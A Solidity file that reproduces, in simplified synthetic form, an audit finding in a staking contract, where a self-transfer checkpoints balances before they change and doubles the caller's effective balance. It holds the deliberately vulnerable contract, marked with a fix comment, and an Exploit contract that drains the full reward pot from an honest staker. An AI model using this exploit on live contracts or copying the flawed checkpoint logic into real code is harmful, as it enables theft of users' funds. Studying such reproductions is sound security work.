// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Resolv — ResolvStakingV2 self-transfer inflates effective balance (Pashov, finding 61872).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _update checkpoints the sender and the receiver before balanceOf changes.
    On a self-transfer the second checkpoint still reads the pre-transfer balance and adds
    the delta, so effective balance doubles and totalEffectiveSupply collapses to that
    doubled figure. The attacker then claims the entire reward pot. The other staker gets 0.
    Vulnerable lines preserved verbatim below (@> VULN). */

contract Token {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Staker {
    function deposit(Staking staking, uint256 amount) external {
        staking.deposit(address(this), amount);
    }

    function claim(Staking staking) external {
        staking.claim(address(this));
    }
}

contract Staking {
    uint256 public constant BOOST = 1e18;
    struct UserData {
        uint256 effectiveBalance;
    }

    Token public reward;
    mapping(address => uint256) public balanceOf;
    mapping(address => UserData) public usersData;
    uint256 public totalEffectiveSupply;
    uint256 public rewardPot;

    constructor(Token reward_) {
        reward = reward_;
    }

    function deposit(address user, uint256 amount) external {
        balanceOf[user] += amount;
        usersData[user].effectiveBalance = amount;
        totalEffectiveSupply += amount;
    }

    function notifyReward(uint256 amount) external {
        rewardPot = amount;
    }

    function transfer(address to, uint256 amount) external {
        _update(msg.sender, to, amount);
    }

    function _update(address _from, address _to, uint256 _value) internal {
        if (_from != address(0) && _to != address(0)) {
            checkpoint(_from, -int256(_value));
            checkpoint(_to, int256(_value)); // @> VULN: second checkpoint runs before balanceOf(_to) changes
            // FIX: require(_from != _to, "self");
        }
        if (_from != _to) {
            balanceOf[_from] -= _value;
            balanceOf[_to] += _value;
        }
    }

    function checkpoint(address _user, int256 _delta) internal {
        totalEffectiveSupply = updateEffectiveBalance(_user, balanceOf[_user], _delta); // @> VULN: userStakedBalance is balanceOf, which the transfer has not updated
    }

    function updateEffectiveBalance(address user, uint256 userStakedBalance, int256 delta) internal returns (uint256) {
        UserData storage userData = usersData[user];
        uint256 newStakedBalance = delta >= 0
            ? userStakedBalance + uint256(delta)
            : userStakedBalance - uint256(-delta);
        uint256 oldEffectiveBalance = userData.effectiveBalance == 0 ? userStakedBalance : userData.effectiveBalance;
        uint256 newEffectiveBalance = newStakedBalance * BOOST / BOOST;
        uint256 newTotal = totalEffectiveSupply - oldEffectiveBalance + newEffectiveBalance;
        userData.effectiveBalance = newEffectiveBalance;
        return newTotal;
    }

    function claim(address user) external returns (uint256 pay) {
        uint256 share = usersData[user].effectiveBalance * rewardPot / totalEffectiveSupply;
        uint256 bal = reward.balanceOf(address(this));
        pay = share < bal ? share : bal;
        if (pay != 0) reward.transfer(user, pay);
    }

    function effectiveOf(address user) external view returns (uint256) {
        return usersData[user].effectiveBalance;
    }
}

contract Exploit {
    Token public reward; // nonce 1
    Staking public staking; // nonce 2
    Staker public victim; // nonce 3
    uint256 public profit;
    uint256 public victimReward;
    uint256 public attackerEffective;
    uint256 public totalEffective;

    constructor() {
        reward = new Token("REWARD");
        staking = new Staking(reward);
        victim = new Staker();
    }

    function run() external {
        staking.deposit(address(this), 100 ether);
        victim.deposit(staking, 100 ether);
        reward.mint(address(staking), 140 ether);
        staking.notifyReward(140 ether);
        staking.transfer(address(this), 100 ether);
        staking.claim(address(this));
        victim.claim(staking);
        uint256 got = reward.balanceOf(address(this));
        reward.transfer(msg.sender, got);
        profit = reward.balanceOf(msg.sender);
        victimReward = reward.balanceOf(address(victim));
        attackerEffective = staking.effectiveOf(address(this));
        totalEffective = staking.totalEffectiveSupply();
        require(attackerEffective == totalEffective, "effective balance is not the whole supply");
        require(profit == 140 ether, "attacker did not take the pot");
        require(victimReward == 0, "honest staker was paid");
    }
}
